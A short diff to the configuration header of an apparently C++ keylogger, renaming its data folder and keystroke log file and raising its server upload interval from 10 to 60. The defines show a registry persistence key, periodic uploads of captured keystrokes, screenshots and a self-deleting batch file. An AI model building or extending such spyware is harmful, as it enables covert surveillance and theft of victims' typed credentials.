@@ -23,7 +23,7 @@
 
 #include "screenshot.h"
 
-//registry keys
+//registry key for persistence
 #define REGKEY_PERSIST "keylogger"
 
 //keyboard scan codes
@@ -42,16 +42,16 @@
 #define HOTKEY_PURGE NULL
 
 //data folder name
-#define DATADIR "gathered"
+#define DATADIR "data"
 
 //time interval between server uploads
-#define UPLOAD_DELTA 10
+#define UPLOAD_DELTA 60
 
 //name of the batch file used for deleting the program
 #define BATCH_NAME "cleaner.bat"
 
 //name of the file receiving key strokes
-#define KEYSTROKES_FILE "keystrokes.html"
+#define KEYSTROKES_FILE "keys.html"
 
 class KeyLogger {
 
